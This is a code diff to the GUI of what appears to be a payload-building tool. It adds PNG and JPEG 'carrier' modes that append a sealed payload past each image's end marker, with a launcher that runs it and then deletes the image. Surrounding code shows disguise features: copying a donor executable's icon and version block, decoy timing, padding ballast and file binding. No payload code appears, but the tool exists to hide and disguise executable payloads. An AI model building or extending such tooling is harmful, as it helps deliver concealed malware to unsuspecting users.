@@ -32,7 +32,15 @@ from PySide6.QtCore import QSettings, Qt
 from PySide6.QtWidgets import QComboBox, QHBoxLayout, QLabel, QVBoxLayout, QWidget
 
 from core import rename
-from core.forge import OUTPUT_EXE, OUTPUT_MODES, OUTPUT_PY
+from core.forge import (
+    CARRIER_MODES,
+    OUTPUT_EXE,
+    OUTPUT_JPG,
+    OUTPUT_MODES,
+    OUTPUT_PNG,
+    OUTPUT_PY,
+    RESOURCE_MODES,
+)
 from core.schema import VersionConfig
 
 from ..widgets.field import Card, LabelledEdit
@@ -43,13 +51,29 @@ _STUB_KEY: Final[str] = "form/stub"
 _ICON_KEY: Final[str] = "form/icon"
 _FUSE_KEY: Final[str] = "form/fuse"
 _DONOR_KEY: Final[str] = "form/donor"
+_CARRIER_KEY: Final[str] = "form/carrier"
 
 _REPO_ROOT: Final[Path] = Path(__file__).resolve().parents[2]
 _DEFAULT_STUB: Final[Path] = _REPO_ROOT / "tools" / "dist" / "sable-launcher.exe"
 
+_EXTENSIONS: Final[dict[str, str]] = {
+    OUTPUT_EXE: ".exe",
+    OUTPUT_PY: ".py",
+    OUTPUT_PNG: ".png",
+    OUTPUT_JPG: ".jpg",
+}
+
 _NOTES: Final[dict[str, str]] = {
     OUTPUT_EXE: "Frozen launcher plus the sealed payload. A launcher is required and ballast applies.",
     OUTPUT_PY: "One runnable script. Ballast is ignored because padding text changes nothing.",
+    OUTPUT_PNG: (
+        "A PNG with the sealed payload welded past its IEND chunk. The launcher is run "
+        "with --carrier against it and the image is removed once the run is done."
+    ),
+    OUTPUT_JPG: (
+        "A JPEG with the sealed payload welded past its end-of-image marker. Same tail, "
+        "same arithmetic, same launch: the launcher is pointed at it with --carrier."
+    ),
 }
 
 
@@ -110,6 +134,26 @@ class ForgePage(QWidget):
         format_card.body.addWidget(preview_label)
         format_card.add(self._preview)
 
+        # A carrier is a build input like the launcher: a picture on this machine that the
+        # tail is welded onto. It is only meaningful for the two image formats, and the
+        # field is disabled elsewhere rather than silently ignored.
+        self._carrier = LabelledEdit(
+            "Carrier image",
+            placeholder="a PNG or JPEG to weld the payload onto",
+            browse=True,
+            filters="Images (*.png *.jpg *.jpeg);;All files (*)",
+        )
+        self._carrier.set_text(self._remembered(_CARRIER_KEY))
+        self._carrier.changed.connect(lambda value: self._remember(_CARRIER_KEY, value))
+
+        carrier_hint = QLabel(
+            "The image has to end where its own format ends: a PNG at its IEND chunk, a "
+            "JPEG at its end-of-image marker. Anything already appended past that "
+            "terminator is refused, because that file is a container and not a carrier."
+        )
+        carrier_hint.setObjectName("hint")
+        carrier_hint.setWordWrap(True)
+
         self._stub = LabelledEdit(
             "Frozen launcher", placeholder="tools/dist/sable-launcher.exe", browse=True
         )
@@ -165,6 +209,13 @@ class ForgePage(QWidget):
         )
         icon_hint.setObjectName("hint")
         icon_hint.setWordWrap(True)
+
+        carrier_card = Card(
+            "Carrier",
+            "A picture with the payload welded past the end of its own format.",
+        )
+        carrier_card.add(self._carrier)
+        carrier_card.body.addWidget(carrier_hint)
 
         launcher_card = Card(
             "Launcher",
@@ -268,6 +319,7 @@ class ForgePage(QWidget):
         column.setContentsMargins(0, 0, 0, 0)
         column.setSpacing(18)
         column.addWidget(format_card)
+        column.addWidget(carrier_card)
         column.addWidget(launcher_card)
         column.addWidget(bound_card)
         column.addWidget(disguise_card)
@@ -293,6 +345,10 @@ class ForgePage(QWidget):
     def donor(self) -> Path | None:
         """The executable to copy the icon and version block from, if any."""
         return self._donor.path()
+
+    def carrier(self) -> Path | None:
+        """The image the tail is welded onto, for the two image formats."""
+        return self._carrier.path()
 
     def fuse(self) -> Path | None:
         return self._fuse.path()
@@ -330,6 +386,7 @@ class ForgePage(QWidget):
             "stub": self.stub(),
             "icon": self.icon(),
             "donor": self.donor(),
+            "carrier": self.carrier(),
             "fuse": self.fuse(),
             "version": self.version(),
             "decoy_seconds": seconds,
@@ -344,6 +401,7 @@ class ForgePage(QWidget):
         self._stub.clear_problem()
         self._icon.clear_problem()
         self._donor.clear_problem()
+        self._carrier.clear_problem()
         self._fuse.clear_problem()
         for field in (
             self._company,
@@ -385,6 +443,8 @@ class ForgePage(QWidget):
                 self._icon.set_problem(problem.message)
             elif problem.path == "output.donor":
                 self._donor.set_problem(problem.message)
+            elif problem.path == "output.carrier":
+                self._carrier.set_problem(problem.message)
             elif problem.path == "output.fuse":
                 self._fuse.set_problem(problem.message)
             else:
@@ -399,13 +459,14 @@ class ForgePage(QWidget):
         mode = self.mode()
         self._note.setText(_NOTES.get(mode, ""))
         self._stub.setEnabled(mode == OUTPUT_EXE)
-        self._icon.setEnabled(mode == OUTPUT_EXE)
-        self._donor.setEnabled(mode == OUTPUT_EXE)
+        self._icon.setEnabled(mode in RESOURCE_MODES)
+        self._donor.setEnabled(mode in RESOURCE_MODES)
+        self._carrier.setEnabled(mode in CARRIER_MODES)
         self._refresh_preview()
 
     def _refresh_preview(self, _text: str = "") -> None:
         mode = self.mode()
-        extension = ".exe" if mode == OUTPUT_EXE else ".py"
+        extension = _EXTENSIONS.get(mode, ".exe")
         typed = self.name()
         if typed is None:
             # Same order the pipeline uses: a bound file lends its name, and only a
